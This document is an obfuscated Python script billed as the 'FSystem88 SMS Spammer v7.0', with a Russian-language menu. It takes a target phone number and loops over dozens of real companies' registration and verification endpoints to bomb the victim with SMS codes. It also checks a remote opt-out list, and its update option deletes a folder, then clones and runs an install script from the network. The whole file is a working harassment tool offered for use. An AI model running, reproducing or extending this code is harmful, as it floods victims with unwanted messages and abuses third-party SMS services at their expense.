#!/usr/bin/python3
import requests #line:4
import random #line:5
import datetime #line:6
import sys #line:7
import time #line:8
import argparse #line:9
import os #line:10
import json #line:11
from colorama import Fore ,Back ,Style #line:12
os .system ("clear")#line:14
def Main ():#line:15
	global info #line:16
	info =" "#line:17
	OO00O00OO0O000OO0 =Fore .GREEN +'''
8888888888888888888888888
8888888888888888888888888
888        888        888
888  888888888  8888  888
888  888888888  888888888
888        888        888
888  888888888888888  888
888  888888888  8888  888
888  888888888        888
8888888888888888888888888
8888888888888888888888888
8888    FSystem88    8888
8888   SMS Spammer   8888
8888      v.7.0      8888
8888     MPL-2.0     8888
8888888888888888888888888
8888888888888888888888888
'''+Style .RESET_ALL #line:36
	def OOO0O000O0000OOOO ():#line:37
		global info #line:38
		while True :#line:39
			os .system ("clear")#line:40
			print (OO00O00OO0O000OO0 )#line:41
			print (info )#line:42
			print ('''
1) Запустить спамер.
2) Добавить номер в антиспам.
3) Проверить номер в антиспамбазе.
4) Обновить спамер.
5) Exit.

Введите номер:''')#line:50
			OOO00O0OO000OO000 =input ("\033[1;36mspymer > \033[1;m")#line:51
			if OOO00O0OO000OO000 =="1":#line:52
				print ("Введите номер (Enter - отмена):")#line:53
				O00OO000O0OO0O0OO =input ("\033[1;36mspymer > \033[1;m")#line:54
				try :#line:55
					if int (O00OO000O0OO0O0OO ):#line:56
						print ("Введите кол-во потоков (Enter - отмена):")#line:57
						OOO0OO0O0O0O00O00 =input ("\033[1;36mspymer > \033[1;m")#line:58
						try :#line:59
							if int (OOO0OO0O0O0O00O00 ):#line:60
								OOO0OO0O0O0O00O00 =int (OOO0OO0O0O0O00O00 )#line:61
								_OO00OOOO000000OOO =O00OO000O0OO0O0OO #line:62
								if _OO00OOOO000000OOO [0 ]=='+':#line:63
									_OO00OOOO000000OOO =_OO00OOOO000000OOO [1 :]#line:64
								if _OO00OOOO000000OOO [0 ]=='8':#line:65
									_OO00OOOO000000OOO ='7'+_OO00OOOO000000OOO [1 :]#line:66
								if _OO00OOOO000000OOO [0 ]=='9':#line:67
									_OO00OOOO000000OOO ='7'+_OO00OOOO000000OOO #line:68
								OOO00000OOO0O0000 =0 #line:69
								O0OO0O00O00O000O0 =requests .post ('https://rainbow-t-shirt.com/spymer/json.php',data ={'phone':_OO00OOOO000000OOO }).json ()["id"]#line:70
								if int (O0OO0O00O00O000O0 )>0 :#line:71
									info =Fore .RED +"Номер телефона находится в антиспам листе.\nЧтобы попасть туда - напиши мне в Telegram:\n@FSystem88"+Style .RESET_ALL #line:72
									OOO0O000O0000OOOO ()#line:73
								elif int (O0OO0O00O00O000O0 )==0 :#line:74
									_OOOOO000O0O00000O =''#line:75
									for O00O00O00OOO00O0O in range (12 ):#line:76
										_OOOOO000O0O00000O =_OOOOO000O0O00000O +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:77
										O00OOOOOO000OOOO0 =_OOOOO000O0O00000O +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:78
										O0O0O0OOOOOO0O00O =_OOOOO000O0O00000O +random .choice (list ('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))#line:79
									_O00O000000OO0OOOO =_OO00OOOO000000OOO [1 :]#line:80
									_O0OOO0OOOOO00OO0O ='+'+_OO00OOOO000000OOO [0 ]+'('+_OO00OOOO000000OOO [1 :4 ]+')'+_OO00OOOO000000OOO [4 :7 ]+'-'+_OO00OOOO000000OOO [7 :9 ]+'-'+_OO00OOOO000000OOO [9 :11 ]#line:81
									_O00O00OO0OOO0OOOO =_O00O000000OO0OOOO [:3 ]+'+'+_O00O000000OO0OOOO [3 :6 ]+'-'+_O00O000000OO0OOOO [6 :8 ]+'-'+_O00O000000OO0OOOO [8 :10 ]#line:82
									_OOOO0OOOO00OOOOOO ='+'+_OO00OOOO000000OOO [0 ]+'+('+_OO00OOOO000000OOO [1 :4 ]+')'+_OO00OOOO000000OOO [4 :7 ]+'-'+_OO00OOOO000000OOO [7 :9 ]+'-'+_OO00OOOO000000OOO [9 :11 ]#line:83
									_OO0O00OOO00O0OOOO ='+'+_OO00OOOO000000OOO [0 ]+' ('+_OO00OOOO000000OOO [1 :4 ]+') '+_OO00OOOO000000OOO [4 :7 ]+' '+_OO00OOOO000000OOO [7 :9 ]+' '+_OO00OOOO000000OOO [9 :11 ]#line:84
									_OOOOO00O0000O0OOO =_OO00OOOO000000OOO [1 :4 ]+') '+_OO00OOOO000000OOO [4 :7 ]+'-'+_OO00OOOO000000OOO [7 :9 ]+'-'+_OO00OOOO000000OOO [9 :11 ]#line:85
									print ('Номер: {}\nЦиклы: {}'.format (O00OO000O0OO0O0OO ,OOO0OO0O0O0O00O00 )+'\nСпамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+C.')#line:86
									_OO00OOOO000000OOO =_OO00OOOO000000OOO #line:87
									_OO00OOOO00OOOOO00 =_OOOOO000O0O00000O +f'{OOO00000OOO0O0000}'+'@gmail.com'#line:88
									OO0O000OOO0OO0OOO =_OOOOO000O0O00000O +f'{OOO00000OOO0O0000}'+'@gmail.com'#line:89
									while OOO00000OOO0O0000 <OOO0OO0O0O0O00O00 :#line:90
										try :#line:91
											requests .post ('https://p.grabtaxi.com/api/passenger/v2/profiles/register',data ={'phoneNumber':_OO00OOOO000000OOO ,'countryCode':'ID','name':'test','email':'mail@mail.com','deviceToken':'*'},headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})#line:92
											requests .post ('https://moscow.rutaxi.ru/ajax_keycode.html',data ={'l':_O00O000000OO0OOOO }).json ()["res"]#line:93
											requests .post ('https://belkacar.ru/get-confirmation-code',data ={'phone':_OO00OOOO000000OOO })#line:94
											requests .post ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data ={'phone_number':_OO00OOOO000000OOO })#line:95
											requests .post ('https://app.karusel.ru/api/v1/phone/',data ={'phone':_OO00OOOO000000OOO })#line:96
											requests .post ('https://api.tinkoff.ru/v1/sign_up',data ={'phone':'+'+_OO00OOOO000000OOO })#line:97
											requests .post ('https://api.mtstv.ru/v1/users',json ={'msisdn':_OO00OOOO000000OOO })#line:98
											requests .post ('https://youla.ru/web-api/auth/request_code',data ={'phone':_OO00OOOO000000OOO })#line:99
											requests .post ('https://pizzahut.ru/account/password-reset',data ={'reset_by':'phone','action_id':'pass-recovery','phone':_OO0O00OOO00O0OOOO ,'_token':'*'})#line:100
											requests .post ('https://www.rabota.ru/remind',data ={'credential':_OO00OOOO000000OOO })#line:101
											requests .post ('https://rutube.ru/api/accounts/sendpass/phone',data ={'phone':'+'+_OO00OOOO000000OOO })#line:102
											requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+_OO00OOOO000000OOO +'/')#line:103
											requests .post ('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',data ={'name':_OOOOO000O0O00000O ,'phone':_OO00OOOO000000OOO ,'promo':'yellowforma'})#line:104
											requests .get ('https://www.oyorooms.com/api/pwa/generateotp?phone='+_O00O000000OO0OOOO +'&country_code=%2B7&nod=4&locale=en')#line:105
											requests .post ('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',params ={'pageName':'loginByUserPhoneVerification','fromCheckout':'false','fromRegisterPage':'true','snLogin':'','bpg':'','snProviderId':''},data ={'phone':'+7 915 3509908','g-recaptcha-response':'','recaptcha':'on'})#line:106
											requests .post ('https://newnext.ru/graphql',json ={'operationName':'registration','variables':{'client':{'firstName':'Иван','lastName':'Иванов','phone':_OO00OOOO000000OOO ,'typeKeys':['Unemployed']}},'query':'mutation registration($client: ClientInput!) {' '\n  registration(client: $client) {' '\n    token\n    __typename\n  }\n}\n'})#line:107
											requests .post ('https://api.sunlight.net/v3/customers/authorization/',data ={'phone':_OO00OOOO000000OOO })#line:108
											requests .post ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json ={'client_type':'personal','email':_OO00OOOO00OOOOO00 ,'mobile_phone':_OO00OOOO000000OOO ,'deliveryOption':'sms'})#line:109
											requests .post ('https://online.sbis.ru/reg/service/',json ={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_OO00OOOO000000OOO },'id':'1'})#line:110
											requests .post ('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',json ={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone':_O00O000000OO0OOOO ,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})#line:111
											requests .post ('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',data ={'phone':_OO00OOOO000000OOO })#line:112
											requests .post ('https://app.karusel.ru/api/v1/phone/',data ={'phone':_OO00OOOO000000OOO })#line:113
											requests .post ('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',json ={'phone':'+'+_OO00OOOO000000OOO })#line:114
											requests .post ('https://lenta.com/api/v1/authentication/requestValidationCode',json ={'phone':'+'+_OO00OOOO000000OOO })#line:115
											requests .post ('https://cloud.mail.ru/api/v2/notify/applink',json ={"phone":"+"+_OO00OOOO000000OOO ,"api":2 ,"email":"email","x-email":"x-email"})#line:116
											requests .post ('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params ={"pageName":"registerPrivateUserPhoneVerificatio"},data ={"phone":_OO00OOOO000000OOO ,"recaptcha":'off',"g-recaptcha-response":""})#line:117
											requests .post ("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data ={"st.r.phone":"+"+_OO00OOOO000000OOO })#line:118
											requests .post ('https://plink.tech/register/',json ={"phone":_OO00OOOO000000OOO })#line:119
											requests .post ("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json ={"phone":_OO00OOOO000000OOO })#line:120
											requests .post ("http://smsgorod.ru/sendsms.php",data ={"number":_OO00OOOO000000OOO })#line:121
											requests .post ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data ={'phone_number':_OO00OOOO000000OOO })#line:122
											requests .post ('https://passport.twitch.tv/register?trusted_request=true',json ={"birthday":{"day":11 ,"month":11 ,"year":1999 },"client_id":"kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code":True ,"password":O00OOOOOO000OOOO0 ,"phone_number":_OO00OOOO000000OOO ,"username":O0O0O0OOOOOO0O00O })#line:123
											requests .post ('https://cabinet.wi-fi.ru/api/auth/by-sms',data ={'msisdn':_OO00OOOO000000OOO },headers ={'App-ID':'cabinet'})#line:124
											requests .post ("https://api.wowworks.ru/v2/site/send-code",json ={"phone":_OO00OOOO000000OOO ,"type":2 })#line:125
											requests .post ('https://eda.yandex/api/v1/user/request_authentication_code',json ={"phone_number":"+"+_OO00OOOO000000OOO })#line:126
											requests .post ('https://youla.ru/web-api/auth/request_code',data ={'phone':_OO00OOOO000000OOO })#line:127
											requests .post ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json ={"client_type":"personal","email":f"{OO0O000OOO0OO0OOO}@gmail.ru","mobile_phone":_OO00OOOO000000OOO ,"deliveryOption":"sms"})#line:128
											requests .post ("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data ={"phone":_OO00OOOO000000OOO })#line:129
											requests .post ('https://www.delivery-club.ru/ajax/user_otp',data ={"phone":_OO00OOOO000000OOO })#line:130
											requests .post ('https://belkacar.ru/get-confirmation-code',data ={'phone':_OO00OOOO000000OOO })#line:131
											requests .post ("https://api.carsmile.com/",json ={"operationName":"enterPhone","variables":{"phone":_OO00OOOO000000OOO },"query":"mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})#line:132
											requests .post ('https://www.citilink.ru/registration/confirm/phone/+'+_OO00OOOO000000OOO +'/')#line:133
											requests .post ("https://api.delitime.ru/api/v2/signup",data ={"SignupForm[username]":_OO00OOOO000000OOO ,"SignupForm[device_type]":3 })#line:134
											requests .get ('https://findclone.ru/register',params ={'phone':'+'+_OO00OOOO000000OOO })#line:135
											requests .post ("https://guru.taxi/api/v1/driver/session/verify",json ={"phone":{"code":1 ,"number":_OO00OOOO000000OOO }})#line:136
											requests .post ('https://www.icq.com/smsreg/requestPhoneValidation.php',data ={'msisdn':_OO00OOOO000000OOO ,"locale":'en','countryCode':'ru','version':'1',"k":"ic1rtwz1s1Hj1O0r","r":"46763"})#line:137
											requests .post ("https://terra-1.indriverapp.com/api/authorization?locale=ru",data ={"mode":"request","phone":"+"+_OO00OOOO000000OOO ,"phone_permission":"unknown","stream_id":0 ,"v":3 ,"appversion":"3.20.6","osversion":"unknown","devicemodel":"unknown"})#line:138
											requests .post ("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data ={"password":O00OOOOOO000OOOO0 ,"application":"lkp","login":"+"+_OO00OOOO000000OOO })#line:139
											requests .post ('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json ={"phone":_OO00OOOO000000OOO })#line:140
											requests .post ("https://api.ivi.ru/mobileapi/user/register/phone/v6",data ={"phone":_OO00OOOO000000OOO })#line:141
											requests .post ('https://youdo.com/api/verification/sendverificationcode/',data ={'PhoneE164':_OO00OOOO000000OOO })#line:142
											OOO00000OOO0O0000 +=1 #line:143
											print (('{} круг пройден.').format (OOO00000OOO0O0000 ))#line:144
										except KeyboardInterrupt :#line:145
											info =Fore .RED +"Спамер остановлен.\nТелефон: {}\nКол-во пройденных циклов: {}".format (O00OO000O0OO0O0OO ,OOO00000OOO0O0000 )+Style .RESET_ALL #line:146
											OOO0O000O0000OOOO ()#line:147
										except :#line:148
											info =Fore .RED +"Странная хуйня - если видишь это, то напиши мне об этой ошbбке в Telegram @FSystem88".format (O00OO000O0OO0O0OO ,OOO00000OOO0O0000 )+Style .RESET_ALL #line:149
											OOO0O000O0000OOOO ()#line:150
									info =Fore .RED +"Готово.\nТелефон: {}\nКол-во пройденных циклов: {}".format (O00OO000O0OO0O0OO ,OOO00000OOO0O0000 )+Style .RESET_ALL #line:151
									OOO0O000O0000OOOO ()#line:152
						except :#line:153
							info =Fore .RED +"Некорректно введено кол-во потоков!".format (O00OO000O0OO0O0OO )+Style .RESET_ALL #line:154
							OOO0O000O0000OOOO ()#line:155
				except :#line:156
					info =Fore .RED +"Некорректно введен номер телефона!".format (O00OO000O0OO0O0OO )+Style .RESET_ALL #line:157
					OOO0O000O0000OOOO ()#line:158
			if OOO00O0OO000OO000 =="2":#line:160
				print ("Введите номер:")#line:161
				O00OO000O0OO0O0OO =input ("\033[1;36mspymer > \033[1;m")#line:162
				if O00OO000O0OO0O0OO [0 ]=='+':#line:163
					O00OO000O0OO0O0OO =O00OO000O0OO0O0OO [1 :]#line:164
				if O00OO000O0OO0O0OO [0 ]=='8':#line:165
					O00OO000O0OO0O0OO ='7'+O00OO000O0OO0O0OO [1 :]#line:166
				if O00OO000O0OO0O0OO [0 ]=='9':#line:167
					O00OO000O0OO0O0OO ='7'+O00OO000O0OO0O0OO #line:168
				try :#line:169
					if int (O00OO000O0OO0O0OO ):#line:170
						O0OO0O00O00O000O0 =requests .post ('https://rainbow-t-shirt.com/spymer/json.php',data ={'phone':O00OO000O0OO0O0OO }).json ()["id"]#line:171
						if int (O0OO0O00O00O000O0 )>0 :#line:172
							info =Fore .GREEN +"Номер {} уже ЕСТЬ в антиспам листе.".format (O00OO000O0OO0O0OO )+Style .RESET_ALL #line:173
							OOO0O000O0000OOOO ()#line:174
						elif int (O0OO0O00O00O000O0 )==0 :#line:175
							requests .post ('https://rainbow-t-shirt.com/spymer/ajax.php',data ={'phone':O00OO000O0OO0O0OO })#line:176
							info =Fore .GREEN +"Номер {} добавлен в антиспам лист.".format (O00OO000O0OO0O0OO )+Style .RESET_ALL #line:177
							OOO0O000O0000OOOO ()#line:178
				except :#line:179
					info =Fore .RED +"Некорректно введен номер телефона!".format (O00OO000O0OO0O0OO )+Style .RESET_ALL #line:180
					OOO0O000O0000OOOO ()#line:181
			if OOO00O0OO000OO000 =="3":#line:183
				print ("Введите номер для проверки:")#line:184
				O00OO000O0OO0O0OO =input ("\033[1;36mspymer > \033[1;m")#line:185
				if O00OO000O0OO0O0OO [0 ]=='+':#line:186
					O00OO000O0OO0O0OO =O00OO000O0OO0O0OO [1 :]#line:187
				if O00OO000O0OO0O0OO [0 ]=='8':#line:188
					O00OO000O0OO0O0OO ='7'+O00OO000O0OO0O0OO [1 :]#line:189
				if O00OO000O0OO0O0OO [0 ]=='9':#line:190
					O00OO000O0OO0O0OO ='7'+O00OO000O0OO0O0OO #line:191
				try :#line:192
					if int (O00OO000O0OO0O0OO ):#line:193
						O0OO0O00O00O000O0 =requests .post ('https://rainbow-t-shirt.com/spymer/json.php',data ={'phone':O00OO000O0OO0O0OO }).json ()["id"]#line:194
						if int (O0OO0O00O00O000O0 )>0 :#line:195
							info =Fore .GREEN +"Номер {} ЕСТЬ в антиспам листе.".format (O00OO000O0OO0O0OO )+Style .RESET_ALL #line:196
							OOO0O000O0000OOOO ()#line:197
						elif int (O0OO0O00O00O000O0 )==0 :#line:198
							info =Fore .RED +"Номера {} НЕТУ в антиспам листе.".format (O00OO000O0OO0O0OO )+Style .RESET_ALL #line:199
							OOO0O000O0000OOOO ()#line:200
				except :#line:201
					info =Fore .RED +"Некорректно введен номер телефона!".format (O00OO000O0OO0O0OO )+Style .RESET_ALL #line:202
					OOO0O000O0000OOOO ()#line:203
			if OOO00O0OO000OO000 =="4":#line:205
				O0OOOO0O0O0OO0OO0 =os .system ("cd && rm -rf ~/spymer && git clone https://github.com/FSystem88/spymer && sh ~/spymer/install.sh")#line:206
				exit ()#line:207
			if OOO00O0OO000OO000 =="5":#line:209
				print (Fore .BLUE +"Дотиданья"+Style .RESET_ALL )#line:210
				exit ()#line:211
	OOO0O000O0000OOOO ()#line:212
Main ()#line:215
